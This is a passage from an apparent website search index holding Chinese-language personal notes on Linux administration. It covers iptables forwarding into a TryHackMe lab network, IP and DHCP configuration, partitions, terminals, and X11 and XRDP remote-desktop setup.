ff0c\u7531kali\u8f6c\u53d1\u81f3THM\u3002\u76f8\u5f53\u4e8e\u8ba9kali\u5145\u5f53\u4e00\u4e2a\u8def\u7531\u5668/\u9632\u706b\u5899\u3002</p> <p>\u62d3\u6251\uff1aWindows(10.10.10.20) \u2014\u2014 kali(eth0:10.10.10.10 \u2014\u2014 enumad:10.50.47.202) \u2014\u2014 THM\u76ee\u6807\u7f51\u7edc(10.200.49.0/24)</p>"},{"location":"Resources/Linux/iptables/#ip","title":"\u542f\u7528IP\u8f6c\u53d1\u529f\u80fd","text":"<p>\u547d\u4ee4\u884c\u5199\u5165\uff1a<code>sysctl [-w] net.ipv4.ip_forward=1</code></p> <ul> <li>\u4f7f\u7528 <code>-w</code> \u5373\u548c\u4fee\u6539 <code>/etc/sysctl.conf</code> \u6587\u4ef6\u91cc\u7684 <code>net.ipv4.ip_forward=1</code> \u4e00\u6837</li> <li>\u82e5\u662f\u4fee\u6539\u914d\u7f6e\u6587\u4ef6\uff0c\u6267\u884c\u6b64\u547d\u4ee4\u4f7f\u66f4\u6539\u751f\u6548\uff1a<code>sysctl -p</code></li> </ul>"},{"location":"Resources/Linux/iptables/#_2","title":"\u786e\u8ba4\u914d\u7f6e","text":"<p>\u786e\u8ba4\u662f\u5426\u4e3a1\uff1a<code>sysctl net.ipv4.ip_forward</code></p>"},{"location":"Resources/Linux/iptables/#_3","title":"\u914d\u7f6e\u8f6c\u53d1\u89c4\u5219","text":""},{"location":"Resources/Linux/iptables/#1","title":"\u65b9\u6cd51","text":"<p>tracert\u7684\u7b2c\u4e00\u8df3\u76f4\u63a5\u76ee\u6807\uff0c\u4e14\u201c\u663e\u793a\u201d\u65e0\u5ef6\u8fdf\u3002</p> <pre><code>sudo iptables -t nat -A PREROUTING -i eth0 -s 10.10.10.20 -j DNAT --to-destination 10.50.47.202\nsudo iptables -t nat -A POSTROUTING -o enumad -s 10.10.10.20 -j MASQUERADE\n</code></pre> <ul> <li><code>-j MASQUERADE</code>\uff1a\u52a8\u6001\u5730\u5bf9\u6e90\u5730\u5740\u8fdb\u884c\u7f51\u7edc\u5730\u5740\u8f6c\u6362\uff08SNAT\uff09\uff0c\u7528\u4e8e\u5b9e\u73b0\u6e90\u5730\u5740\u4f2a\u88c5\uff0c\u4f7f\u5176\u770b\u8d77\u6765\u597d\u50cf\u662f\u4ece\u8f6c\u53d1\u89c4\u5219\u51fa\u53e3\u7684\u63a5\u53e3\u53d1\u9001\u7684\u3002\u5728\u4e00\u4e2a\u7f51\u7edc\u4e2d\uff0c\u5f53\u4f60\u6709\u591a\u4e2a\u4e3b\u673a\u901a\u8fc7\u4e00\u4e2a\u516c\u5171IP\u5730\u5740\u8fde\u63a5\u5230\u4e92\u8054\u7f51\u65f6\uff0c\u4f60\u9700\u8981\u4f7f\u7528NAT\u6765\u8f6c\u6362\u7f51\u7edc\u6570\u636e\u5305\u7684\u6e90\u5730\u5740\u548c\u76ee\u6807\u5730\u5740\u3002\u8fd9\u4f7f\u5f97\u6570\u636e\u5305\u5728\u4ece\u79c1\u6709\u7f51\u7edc\u4f20\u8f93\u5230\u516c\u5171\u7f51\u7edc\u65f6\uff0c\u770b\u8d77\u6765\u597d\u50cf\u662f\u7531NAT\u8bbe\u5907\uff08\u901a\u5e38\u662f\u8def\u7531\u5668\uff09\u53d1\u9001\u7684\uff0c\u800c\u4e0d\u662f\u6765\u81ea\u4e8e\u539f\u59cb\u7684\u4e3b\u673a\u3002</li> <li>Linux\u4e0a\u7684 <code>IP MASQUERADE</code> \u5c31\u662f\u4e00\u822c\u610f\u4e49\u4e0a\u7684 <code>NAPT</code></li> <li>\u4e0e\u65b9\u6cd52\u7c7b\u4f3c\uff0c\u53ef\u7406\u89e3\u4e3a\u65b9\u6cd51\u6307\u5b9a\u51fa\u53e3\u7684\u6e90IP\u4e3a\u63a5\u53e3\u5e76\u914d\u7f6eMASQUERADE\uff0c\u800c\u65b9\u6cd52\u76f4\u63a5\u6307\u5b9a\u6e90IP\u4e3a\u63a5\u53e3\u7684IP\u3002</li> </ul>"},{"location":"Resources/Linux/iptables/#2","title":"\u65b9\u6cd52","text":"<pre><code>sudo iptables -t nat -A PREROUTING -s 10.10.10.20 -d 10.10.10.10 -j DNAT --to-destination 10.50.47.202\nsudo iptables -t nat -A POSTROUTING -s 10.10.10.20 -j SNAT --to-source 10.50.47.202\n</code></pre>"},{"location":"Resources/Linux/iptables/#3","title":"\u65b9\u6cd53","text":"<pre><code>sudo iptables -A FORWARD -i eth0 -o enumad -s 10.10.10.20 -j ACCEPT\nsudo iptables -A FORWARD -i enumad -o eth0 -d 10.10.10.20 -m state --state RELATED,ESTABLISHED -j ACCEPT\nsudo iptables -t nat -A POSTROUTING -o enumad -s 10.10.10.20 -j MASQUERADE\n</code></pre> <ul> <li>\u8fd9\u4e2a\u65b9\u6cd5\u662f\u6700\u8be6\u7ec6\u7684\uff0c\u5305\u62ec\u4e86\u9632\u706b\u5899\u89c4\u5219\u548cNAT\u89c4\u5219\u3002</li> <li>\u524d\u4e24\u6761\u89c4\u5219\u7528\u4e8e\u5141\u8bb8\u4ece10.10.10.20\u523010.50.47.202\u7684\u6d41\u91cf\u901a\u8fc7\u9632\u706b\u5899\u3002\u7b2c\u4e00\u6761\u89c4\u5219\u5141\u8bb8\u51fa\u7ad9\u6d41\u91cf\uff0c\u7b2c\u4e8c\u6761\u89c4\u5219\u5141\u8bb8\u76f8\u5173\u6216\u5df2\u5efa\u7acb\u7684\u6d41\u91cf\u8fd4\u56de\u3002</li> <li>\u7b2c\u4e09\u6761\u89c4\u5219\u4f7f\u7528MASQUERADE\u5bf9\u6d41\u91cf\u8fdb\u884cNAT\uff08\u540c\u65b9\u6cd51\u7684\u7b2c\u4e8c\u6761\u89c4\u5219\uff09\uff0c\u4ee5\u4fbf\u4ece10.10.10.20\u53d1\u9001\u7684\u6d41\u91cf\u7ecf\u8fc7enumad\u63a5\u53e3\u65f6\u5177\u6709\u4f2a\u88c5\u7684\u6e90IP\u5730\u5740\u3002</li> </ul>"},{"location":"Resources/Linux/iptables/#_4","title":"\u5176\u4ed6\u547d\u4ee4","text":"<ul> <li>\u786e\u8ba4\u914d\u7f6e\u7684NAT\u8868\uff1a<code>sudo iptables -t nat -L</code></li> <li>\u786e\u8ba4filter\u8868\uff1a<code>sudo iptables -L</code> \uff08\u56e0\u4e3aiptables\u9ed8\u8ba4filter\u8868\u6240\u4ee5\u4e0d\u7528<code>-t</code>\u9009\u9879\uff09</li> <li>\u6e05\u9664\u914d\u7f6e\uff1a<code>sudo iptables -F [-t nat]</code></li> </ul>"},{"location":"Resources/Linux/iptables/#_5","title":"\u6ce8\u610f","text":"<ul> <li>\u9700\u8981\u5728Windows\u6dfb\u52a0\u8def\u7531\uff1a<code>route add 10.200.49.0 mask 255.255.255.0 10.10.10.10</code></li> <li>\u8fd9\u4e9b\u89c4\u5219\u5c06\u5728\u5f53\u524d\u4f1a\u8bdd\u4e2d\u751f\u6548\uff0c\u4f46\u4e0d\u4f1a\u5728\u7cfb\u7edf\u91cd\u542f\u540e\u6301\u4e45\u751f\u6548\u3002\u5982\u679c\u4f60\u5e0c\u671b\u5728\u7cfb\u7edf\u91cd\u542f\u540e\u4ecd\u7136\u751f\u6548\uff0c\u4f60\u9700\u8981\u5c06\u8fd9\u4e9b\u547d\u4ee4\u6dfb\u52a0\u5230\u9002\u5f53\u7684\u542f\u52a8\u811a\u672c\u4e2d\uff08\u5982/etc/rc.local\uff09\u3002\uff08\u4e5f\u6709\u5176\u4ed6\u65b9\u5f0f\uff09</li> </ul>"},{"location":"Resources/Linux/%E4%BF%AE%E6%94%B9IP/","title":"\u4fee\u6539IP","text":"","tags":["IT/Linux"]},{"location":"Resources/Linux/%E4%BF%AE%E6%94%B9IP/#dhcp","title":"\u5237\u65b0DHCP","text":"<p>[[Kali\u642d\u5efa#Hyper-V]]\u5e38\u7528</p> <p><code>ip a &amp;&amp; sudo dhclient -r &amp;&amp; sudo dhclient &amp;&amp; ip a</code></p>","tags":["IT/Linux"]},{"location":"Resources/Linux/%E4%BF%AE%E6%94%B9IP/#gui","title":"GUI\u65b9\u5f0f","text":"<p>NetworkManager \u5c06\u53ea\u5904\u7406\u672a\u5728/etc/network/interfaces\u4e2d\u58f0\u660e\u7684\u63a5\u53e3\uff08\u5373\uff1aCLI\u914d\u7f6e\u4e00\u822c\u4f18\u5148\u4e8eGUI\uff09</p> <p>https://wiki.debian.org/NetworkManager</p> <p>GUI\u6539IP\u662f\u7528API\uff0c\u6ca1\u6709\u76f4\u63a5\u4fee\u6539\u4ec0\u4e48\u6587\u4ef6\u3002\u53ef\u4ee5\u65ad\u5f00\u7f51\u7edc\u91cd\u8fde\u5c31\u5e94\u7528\u914d\u7f6e\u4e86\u3002</p>","tags":["IT/Linux"]},{"location":"Resources/Linux/%E4%BF%AE%E6%94%B9IP/#debianubuntu","title":"Debian/Ubuntu \u4e0a\u7684\u7f51\u7edc\u6587\u4ef6","text":"<p><code>/etc/network/interfaces</code>\uff0c\u7f16\u8f91\u540e\u91cd\u542f\u7f51\u5361\u670d\u52a1\uff1a<code>sudo service networking restart</code></p> <p>\u9759\u6001IP\uff1a <pre><code># \u73af\u56de\u5730\u5740\nauto lo\niface lo inet loopback\n# \u5c06eth0\u8bbe\u7f6e\u4e3a\u9759\u6001IP\nauto eth0\niface eth0 inet static\naddress 10.10.10.10/24  # \u6362\u884c netmask 255.255.255.0 \u4e00\u6837\u3002\ngateway 10.10.10.2\n</code></pre></p> <p>DHCP\uff1a <pre><code># \u73af\u56de\u5730\u5740\nauto lo\niface lo inet loopback\n# \u5c06eth0\u8bbe\u7f6e\u4e3aDHCP\nauto eth0\niface eth0 inet dhcp\n</code></pre></p>","tags":["IT/Linux"]},{"location":"Resources/Linux/%E4%BF%AE%E6%94%B9IP/#centos","title":"CentOS","text":"<ul> <li>/etc/sysconfig/network-scripts</li> <li>\u7528init\u505a\u670d\u52a1\u7ba1\u7406\u5668\u7684OS\uff1aservice networking restart</li> <li>\u7528systemd\u505a\u670d\u52a1\u7ba1\u7406\u5668\u7684OS\uff1asystemctl restart network</li> <li>CentOS8\u4e4b\u540e\u7528\uff1asystemctl restart NetworkManager<ul> <li>https://i-think-it.net/rhel8-network-restart/</li> </ul> </li> </ul>","tags":["IT/Linux"]},{"location":"Resources/Linux/%E5%88%86%E5%8C%BA/","title":"\u5206\u533a","text":"","tags":["IT/Linux"]},{"location":"Resources/Linux/%E5%88%86%E5%8C%BA/#_1","title":"\u57fa\u7840\u6982\u5ff5","text":"<p>[!note] \u78c1\u76d8/\u5757\u8bbe\u5907 --&gt; \u5206\u533a\uff08\u6587\u4ef6\u7cfb\u7edf\uff09 &lt;--&gt; \u76ee\u5f55\u6811</p> <p>\u78c1\u76d8/\u5757\u8bbe\u5907\u4f7f\u7528\u524d\u9700\u8981\u8fdb\u884c\u5206\u5272\uff08\u903b\u8f91\u5212\u5206\uff09\u2014\u2014\u5373\u5206\u533a\u3002</p> <p>\u5757\u8bbe\u5907\u662f\u4e00\u79cd\u6570\u636e\u5b58\u50a8\u8bbe\u5907\uff0c\u5b83\u5141\u8bb8\u4ee5\u56fa\u5b9a\u5927\u5c0f\u7684\u6570\u636e\u5757\u4e3a\u5355\u4f4d\u6765\u8bbf\u95ee\u6570\u636e\u3002\u5e38\u89c1\u7684\u5757\u8bbe\u5907\u5305\u62ec\uff1a</p> <ul> <li>\u786c\u76d8\u9a71\u52a8\u5668 (HDD)</li> <li>\u56fa\u6001\u786c\u76d8 (SSD)</li> <li>\u5149\u76d8\u9a71\u52a8\u5668 (CD/DVD)</li> <li>USB \u95ea\u5b58\u9a71\u52a8\u5668</li> </ul> <p>\u6587\u4ef6\u7cfb\u7edf\u5efa\u7acb\u5728\u5206\u533a\u4e4b\u4e0a\u3002\u800c\u540e\u53c8\u5c06\u5404\u5206\u533a\u6302\u8f7d\u5230\u76ee\u5f55\u3002\u4f7f\u5176\u53ef\u901a\u8fc7\u6307\u5b9a\u7684\u76ee\u5f55\u8def\u5f84\u8bbf\u95ee\u548c\u4f7f\u7528\u76ee\u6807\u6587\u4ef6\u7cfb\u7edf\u3002</p>","tags":["IT/Linux"]},{"location":"Resources/Linux/%E5%88%86%E5%8C%BA/#mrb","title":"MRB\u5206\u533a\u8868","text":"<p>\u5206\u4e3a\u4e3b\u5206\u533a\u3001\u6269\u5c55\u5206\u533a\u3002\u4e24\u8005\u52a0\u8d77\u6765\u6700\u591a4\u4e2a\uff08\u524d4\u4e2a\uff0c\u4ece\u7b2c5\u4e2a\u5f00\u59cb\u662f\u903b\u8f91\u5206\u533a\uff09\u3002\u56e0\u4e3aMBR\u5927\u5c0f\u4e3a512B\uff0c\u5176\u4e2d\u5206\u533a\u8868\u536064B\uff0c\u800c\u6bcf\u4e2a\u5206\u533a\u8868\u7684\u4fe1\u606f\u662f16B\u3002</p> <p>\u5176\u4e2d\u6269\u5c55\u5206\u533a\u5185\u8bb0\u5f55\u903b\u8f91\u5206\u533a\uff08\u903b\u8f91\u5206\u533a\u5fc5\u987b\u5efa\u7acb\u5728\u6269\u5c55\u5206\u533a\u4e4b\u4e0a\uff09\u3002\u800c\u6570\u636e\u5c31\u5b58\u653e\u4e8e\u4e3b\u5206\u533a\u548c\u903b\u8f91\u5206\u533a\u3002</p>","tags":["IT/Linux"]},{"location":"Resources/Linux/%E5%88%86%E5%8C%BA/#gpt","title":"GPT\u5206\u533a\u8868","text":"<p>\uff08\u5f85\u8865\u5145\uff09</p>","tags":["IT/Linux"]},{"location":"Resources/Linux/%E5%88%86%E5%8C%BA/#_2","title":"\u78c1\u76d8\u5212\u5206\u7684\u7c7b\u578b","text":"<ul> <li>\u6807\u51c6\u5212\u5206\uff1a\u6bcf\u4e2a\u5206\u533a\u90fd\u6709\u4e00\u4e2a\u786e\u5b9a\u7684\u6302\u8f7d\u70b9\u3002\u8981\u66f4\u6539\u7684\u8bdd\u9700\u8981\u91cd\u65b0\u5206\u533a\u3002</li> <li>LVM\u5212\u5206</li> </ul>","tags":["IT/Linux"]},{"location":"Resources/Linux/%E5%88%86%E5%8C%BA/#_3","title":"\u786e\u8ba4\u4f7f\u7528\u7684\u5206\u533a\u7c7b\u578b/\u5212\u5206\u7c7b\u578b","text":"<p>cat /etc/fstab\uff1a\u5982\u679c\u4f60\u770b\u5230\u5206\u533a\u7684\u540d\u79f0\u662f /dev/mapper\uff0c\u90a3\u4e48\u8fd9\u5f88\u53ef\u80fd\u662fLVM\u903b\u8f91\u5377\u3002</p>","tags":["IT/Linux"]},{"location":"Resources/Linux/%E5%88%86%E5%8C%BA/#_4","title":"\u5206\u533a\u7684\u8868\u793a","text":"<p>\u5bf9\u4e8e\uff1a<code>/dev/sda1</code></p> <ul> <li>dev\uff1a\u8bbe\u5907\u6587\u4ef6\u7684\u76ee\u5f55</li> <li>sd\uff1aSCSI\u8bbe\u5907</li> <li>hd\uff1aIDE\u8bbe\u5907</li> <li>a-z\uff1a\u786c\u76d8\u5e8f\u53f7</li> <li>1~\uff1a\u5206\u533a\u53f7</li> <li>\u4e0d\u8fc7\u6839\u636e\u78c1\u76d8\u786c\u4ef6\uff0c\u4e5f\u4f1a\u6709\u66f4\u8be6\u7ec6\u7684\u8868\u793a\u65b9\u5f0f\uff0c\u5982pMsN\uff1a\u63d2\u69fdN\u4e2d\u603b\u7ebfM\u4e0a\u7684PCI\u8bbe\u5907\u3002</li> </ul> <p></p> <p>\u73b0\u5728\u5927\u90e8\u5206SCSI\u3002\u6570\u5b57\u90e8\u5206\u524d4\u4e2a\u662f\u4e3b\u5206\u533a/\u6269\u5c55\u5206\u533a\uff0c5\u662f\u7b2c\u4e00\u4e2a\u903b\u8f91\u5206\u533a\u3002</p>","tags":["IT/Linux"]},{"location":"Resources/Linux/%E5%91%BD%E4%BB%A4%E9%A3%8E%E6%A0%BC/","title":"\u547d\u4ee4\u98ce\u683c","text":"<ul> <li>BSD \u98ce\u683c\u7684\u53c2\u6570\uff0c\u524d\u9762\u4e0d\u52a0\u7834\u6298\u7ebf\uff0c\u4f8b\u5982\uff1a<code>h</code></li> <li>Unix \u98ce\u683c\u7684\u53c2\u6570\uff0c\u524d\u9762\u52a0\u5355\u7834\u6298\u7ebf\uff0c\u4f8b\u5982\uff1a<code>-H</code></li> <li>GNU \u98ce\u683c\u7684\u957f\u53c2\u6570\uff0c\u524d\u9762\u52a0\u53cc\u7834\u6298\u7ebf\uff0c\u4f8b\u5982\uff1a<code>--help</code></li> </ul>","tags":["IT/Linux"]},{"location":"Resources/Linux/%E5%91%BD%E5%90%8D%E7%AE%A1%E9%81%93/","title":"\u547d\u540d\u7ba1\u9053","text":"<p>mkfifo\uff1amake FIFO(\u5148\u8fdb\u5148\u51fa)</p> <p>\u533f\u540d\u7ba1\u9053\u9700\u8981\u5728\u76f8\u5173\u8fdb\u7a0b\u5185\uff0c\u800cfifo\u4e0d\u7528\u3002</p> <p>[!note] \u5173\u8054\uff1aSMB\u7684IPC$\uff1aRPC\u5373\u8fdc\u7a0b\u7684IPC</p>","tags":["\u6e17\u900f","IT/Linux"]},{"location":"Resources/Linux/%E6%8D%A2%E8%A1%8C%E7%AC%A6/","title":"\u6362\u884c\u7b26","text":"","tags":["IT/Linux","IT/Windows"]},{"location":"Resources/Linux/%E6%8D%A2%E8%A1%8C%E7%AC%A6/#m","title":"<code>^M</code> \u56de\u8f66\u9057\u7559","text":"<p><code>^M</code>\u5373 Ctrl+M\u3002</p> <p>\u539f\u56e0\uff1a\u5982\u4e0b\u6240\u793a\uff0cDOS\u6587\u672c\u4f20\u5230Unix\u7cfb\u7edf\u540e\uff0c\u6362\u884c\u7b26<code>\\n</code>\u53ef\u89e3\u6790\uff0c\u4f46\u56de\u8f66\u7b26<code>\\r</code>\u5c31\u9057\u7559\u4e0b\u6765\u4e86\u3002\u6ca1\u6709\u5b9e\u9645\u7528\u5904\uff0c\u53ef\u4ee5\u4fdd\u7559\u4e5f\u53ef\u4ee5\u5220\u9664\u3002 - DOS\u662f<code>\\r\\n</code>\uff08CRLF,Carriage-Return Line-Feed\uff09 - Unix\u662f<code>\\n</code></p>","tags":["IT/Linux","IT/Windows"]},{"location":"Resources/Linux/%E6%8D%A2%E8%A1%8C%E7%AC%A6/#_1","title":"\u8f6c\u6362\u4e0e\u5220\u9664","text":"<p>vi\u6253\u5f00\u811a\u672c\u8f93\u5165<code>:set ff?</code>\u67e5\u770b\uff0c<code>:set ff=unix</code>\u66f4\u6539\u3002 - ff: fileformat</p>","tags":["IT/Linux","IT/Windows"]},{"location":"Resources/Linux/%E7%BB%88%E7%AB%AF/","title":"\u7ec8\u7aef","text":"<p>\u6307\u5404\u79cd\u7c7b\u578b\u7684\u7ec8\u7aef\u8bbe\u5907 - \u4e32\u53e3\u7ec8\u7aef\u3002 - \u4f2a\u7ec8\u7aef\uff08/dev/pty/\uff09\u3002\u903b\u8f91\u7ec8\u7aef - \u63a7\u5236\u7ec8\u7aef\uff08/dev/tty\uff09\u3002\u63a7\u5236\u8fdb\u7a0b\u3002 - \u63a7\u5236\u53f0\u7ec8\u7aef\uff08/dev/ttyn, /dev/console\uff09\u3002\u5728UNIX\u7cfb\u7edf\u4e2d\uff0c\u8ba1\u7b97\u673a\u663e\u793a\u5668\u901a\u5e38\u88ab\u79f0\u4e3a\u63a7\u5236\u53f0\u7ec8\u7aef\uff08Console\uff09\u3002</p> <p></p> <ul> <li>\u7269\u7406\u7ec8\u7aef\uff08console\uff09</li> <li>\u865a\u62df\u7ec8\u7aef\uff08tty\uff09\uff1a\u5373\u6587\u672c\u7ec8\u7aef\u3002\u7528\u4e8e\u975eGUI\u73af\u5883\u3002<ul> <li>\u4f2a\u7ec8\u7aef\uff08pty\uff0cpseudo-terminal\uff09\uff1a\u5f53\u4f60\u5728\u56fe\u5f62\u754c\u9762\u4e0b\u6253\u5f00\u7ec8\u7aef\u6a21\u62df\u5668\uff08\u4f8b\u5982xterm\uff09\u65f6\uff0c\u5b83\u4f1a\u6253\u5f00\u4e00\u4e2a\u4f2a\u7ec8\u7aef\u5bf9\uff0c\u5176\u4e2d\u4e00\u4e2a\u7aef\u53e3\u7528\u4e8e\u7ec8\u7aef\u6a21\u62df\u5668\u4e0eShell\u4e4b\u95f4\u7684\u8f93\u5165\u548c\u8f93\u51fa\uff0c\u53e6\u4e00\u4e2a\u7aef\u53e3\u7528\u4e8eShell\u4e0e\u7ec8\u7aef\u6a21\u62df\u5668\u4e4b\u95f4\u7684\u8f93\u5165\u548c\u8f93\u51fa\u3002\u8fd9\u6837\uff0c\u7ec8\u7aef\u6a21\u62df\u5668\u5c31\u53ef\u4ee5\u6a21\u62df\u4e00\u4e2a\u6807\u51c6\u7ec8\u7aef\uff0c\u5e76\u5141\u8bb8\u4f60\u4e0eShell\u4ea4\u4e92\u3002<ul> <li>\u4f2a\u7ec8\u7aef\u4ece\u8bbe\u5907\uff08pts\uff0cpseudo-terminal secondary\uff09\uff1a\u662f\u4f2a\u7ec8\u7aef\u7684\u4e00\u4e2a\u5b9e\u4f8b\u3002\u5f53\u4f60\u5728\u56fe\u5f62\u754c\u9762\u4e0b\u6253\u5f00\u4e00\u4e2a\u7ec8\u7aef\u6a21\u62df\u5668\uff08\u4f8b\u5982xterm\uff09\u65f6\uff0c\u7cfb\u7edf\u4f1a\u521b\u5efa\u4e00\u4e2a\u4f2a\u7ec8\u7aef\u4e3b\u8bbe\u5907\uff08\u901a\u5e38\u88ab\u79f0\u4e3a/dev/ptmx\uff0c\u5373\u4e0b\u56fe\u7684ptm\u5c0f\u4eba\uff09\uff0c\u4ee5\u53ca\u76f8\u5e94\u6570\u91cf\u7684\u4f2a\u7ec8\u7aef\u4ece\u8bbe\u5907\uff08\u901a\u5e38\u4f4d\u4e8e/dev/pts/\u76ee\u5f55\u4e0b\uff09\u3002\u6bcf\u4e2a\u4f2a\u7ec8\u7aef\u4ece\u8bbe\u5907\uff08PTS\uff09\u90fd\u4e0e\u4e00\u4e2a\u7ec8\u7aef\u6a21\u62df\u5668\u76f8\u5173\u8054\uff0c\u5141\u8bb8\u4f60\u5728\u56fe\u5f62\u754c\u9762\u4e0b\u4e0eShell\u8fdb\u884c\u4ea4\u4e92\u3002 </li> </ul> </li> </ul> </li> </ul> <p>\u901a\u4fd7\u5730\u8bf4\uff0cTTY \u548c PTS \u4e4b\u95f4\u7684\u4e3b\u8981\u533a\u522b\u5728\u4e8e\u4e0e\u8ba1\u7b97\u673a\u7684\u8fde\u63a5\u7c7b\u578b\u3002TTY \u7aef\u53e3\u662f\u4e0e\u8ba1\u7b97\u673a\u7684\u76f4\u63a5\u8fde\u63a5\uff0c\u4f8b\u5982\u952e\u76d8/\u9f20\u6807\u6216\u4e0e\u8bbe\u5907\u7684\u4e32\u884c\u8fde\u63a5\u3002PTS \u8fde\u63a5\u662f SSH \u8fde\u63a5\u6216 telnet \u8fde\u63a5\u3002\u6240\u6709\u8fd9\u4e9b\u8fde\u63a5\u90fd\u53ef\u4ee5\u8fde\u63a5\u5230\u4e00\u4e2a shell\uff0c\u5b83\u5141\u8bb8\u60a8\u5411\u8ba1\u7b97\u673a\u53d1\u51fa\u547d\u4ee4\u3002</p> <p>\u7ec8\u7aef\u4e0econsole</p> <ul> <li>\u7ec8\u7aef\uff1a\u4e0d\u5728\u4e3b\u673a\u4e0a\uff0c\u8fdc\u7aef\u63a7\u5236</li> <li>console\uff1a\u4e3b\u673a\u4e0a\u7684\u63a7\u5236\u9762\u677f\uff0c\u672c\u673a\u63a7\u5236\u3002</li> </ul> <p></p>","tags":["IT/Linux"]},{"location":"Resources/Linux/%E9%85%8D%E7%BD%AELinux%E5%9B%BE%E5%BD%A2%E6%A1%8C%E9%9D%A2%E8%BF%9E%E6%8E%A5/","title":"\u914d\u7f6eLinux\u56fe\u5f62\u684c\u9762\u8fde\u63a5","text":"","tags":["IT/Linux"]},{"location":"Resources/Linux/%E9%85%8D%E7%BD%AELinux%E5%9B%BE%E5%BD%A2%E6%A1%8C%E9%9D%A2%E8%BF%9E%E6%8E%A5/#_1","title":"\u5171\u540c\u6b65\u9aa4","text":"<p>\u5b89\u88c5\u684c\u9762\u73af\u5883 ^32a346</p> <pre><code>sudo dnf/apt-get update\n## xfce4\uff1akali\u9ed8\u8ba4\nsudo dnf/apt-get install xfce4\n\n## \u57fa\u672c\u7684 GNOME \u684c\u9762\u7ec4\u4ef6\nsudo yum groupinstall \"X Window System\" \"GNOME\"\u3002\u7136\u540e\u8fd0\u884c\u201cstartx\u201d\u542f\u52a8\u3002\n## \u5b8c\u6574\u684c\u9762\u73af\u5883\nsudo yum groupinstall \"Server with GUI\"\n</code></pre>","tags":["IT/Linux"]},{"location":"Resources/Linux/%E9%85%8D%E7%BD%AELinux%E5%9B%BE%E5%BD%A2%E6%A1%8C%E9%9D%A2%E8%BF%9E%E6%8E%A5/#x11","title":"X11\u65b9\u6848","text":"","tags":["IT/Linux"]},{"location":"Resources/Linux/%E9%85%8D%E7%BD%AELinux%E5%9B%BE%E5%BD%A2%E6%A1%8C%E9%9D%A2%E8%BF%9E%E6%8E%A5/#linux","title":"Linux\u7aef","text":"<pre><code>/etc/ssh/sshd_config\nX11Forwarding yes\nsudo systemctl reload sshd\n</code></pre>","tags":["IT/Linux"]},{"location":"Resources/Linux/%E9%85%8D%E7%BD%AELinux%E5%9B%BE%E5%BD%A2%E6%A1%8C%E9%9D%A2%E8%BF%9E%E6%8E%A5/#windows","title":"Windows\u7aef","text":"\u2753 \u4e0b\u8f7d\u5e76\u5b89\u88c5X\u670d\u52a1\u5668\uff1aVcXsrv\u6216Xming <p><code>ssh -X user@192.168.1.100</code></p>","tags":["IT/Linux"]},{"location":"Resources/Linux/%E9%85%8D%E7%BD%AELinux%E5%9B%BE%E5%BD%A2%E6%A1%8C%E9%9D%A2%E8%BF%9E%E6%8E%A5/#xfce","title":"\u8fd0\u884cXFCE\u6216\u5176\u4ed6\u56fe\u5f62\u754c\u9762\u7a0b\u5e8f","text":"<p>\u4e00\u65e6\u8fde\u63a5\uff0c\u5c31\u53ef\u4ee5\u5728SSH\u4f1a\u8bdd\u4e2d\u542f\u52a8XFCE\u684c\u9762\u6216\u4efb\u4f55\u5176\u4ed6\u56fe\u5f62\u754c\u9762\u7a0b\u5e8f\u3002 \u4f8b\u5982\uff0c\u8fd0\u884c xfce4-terminal \u6765\u6253\u5f00XFCE\u7ec8\u7aef\u3002</p> <p>\u5b83\u9002\u5408\u8fd0\u884c\u5355\u4e2a\u5e94\u7528\u7a0b\u5e8f\uff0c\u800c\u4e0d\u662f\u6574\u4e2a\u684c\u9762\u73af\u5883\u3002\u5982\u679c\u9700\u8981\u8fdc\u7a0b\u8bbf\u95ee\u6574\u4e2a\u684c\u9762\uff0c\u53ef\u80fd\u9700\u8981\u8003\u8651\u4f7f\u7528VNC\u6216XRDP\u7b49\u5176\u4ed6\u89e3\u51b3\u65b9\u6848\u3002</p>","tags":["IT/Linux"]},{"location":"Resources/Linux/%E9%85%8D%E7%BD%AELinux%E5%9B%BE%E5%BD%A2%E6%A1%8C%E9%9D%A2%E8%BF%9E%E6%8E%A5/#xrdp","title":"XRDP\u65b9\u6848","text":"<p>[!NOTE] [[Kali\u642d\u5efa#Hyper-V|Hyper-V]]\u7684\u589e\u5f3a\u4f1a\u8bdd\u6a21\u5f0f\u5c31\u662f\u8fd9\u4e2a\uff0c\u6240\u4ee5\u4e0d\u8981\u6740xrdp\u7684\u8fdb\u7a0b\uff01\uff01</p>","tags":["IT/Linux"]},{"location":"Resources/Linux/%E9%85%8D%E7%BD%AELinux%E5%9B%BE%E5%BD%A2%E6%A1%8C%E9%9D%A2%E8%BF%9E%E6%8E%A5/#linux_1","title":"Linux\u7aef","text":"<pre><code>sudo dnf/apt-get install xrdp\nsudo systemctl start xrdp\nsudo systemctl enable xrdp\n</code></pre>","tags":["IT/Linux"]},{"location":"Resources/Linux/%E9%85%8D%E7%BD%AELinux%E5%9B%BE%E5%BD%A2%E6%A1%8C%E9%9D%A2%E8%BF%9E%E6%8E%A5/#xfce_1","title":"\u914d\u7f6eXFCE\u684c\u9762\u73af\u5883","text":"<pre><code>echo xfce4-session &gt; ~/.xsession\necho \"startxfce4\" &gt; ~/.xsession\uff1a\u786e\u4fdd\u4e86\u5f53\u60a8\u901a\u8fc7XRDP\u8fde\u63a5\u65f6\uff0c\u4f1a\u542f\u52a8XFCE\u684c\u9762\u73af\u5883\n</code></pre>","tags":["IT/Linux"]},{"location":"Resources/Linux/%E9%85%8D%E7%BD%AELinux%E5%9B%BE%E5%BD%A2%E6%A1%8C%E9%9D%A2%E8%BF%9E%E6%8E%A5/#fw","title":"\u914d\u7f6eFW","text":"<pre><code>sudo firewall-cmd --add-port=3389/tcp --permanent\nsudo firewall-cmd --reload\n</code></pre>","tags":["IT/Linux"]},{"location":"Resources/Linux/%E9%85%8D%E7%BD%AELinux%E5%9B%BE%E5%BD%A2%E6%A1%8C%E9%9D%A2%E8%BF%9E%E6%8E%A5/#windows_1","title":"Windows\u7aef","text":"<p>RDP\u8fde\u63a5\u3002\u6ce8\u610flinux\u7aef\u9700\u8981\u5f00\u542f3389\u3002</p>","tags":["IT/Linux"]},{"location":"Resources/Network/Email/","title":"Email","text":"","tags":["IT/\u7f51\u7edc"]},{"location":"Resources/Network/Email/#_1","title":"\u7aef\u53e3","text":"<p>Email-client-protocols-and-port-numbers</p>","tags":["IT/\u7f51\u7edc"]},{"location":"Resources/Network/Email/#smtp","title":"SMTP","text":"<p>\u53d1\u9001\u3002</p> <ul> 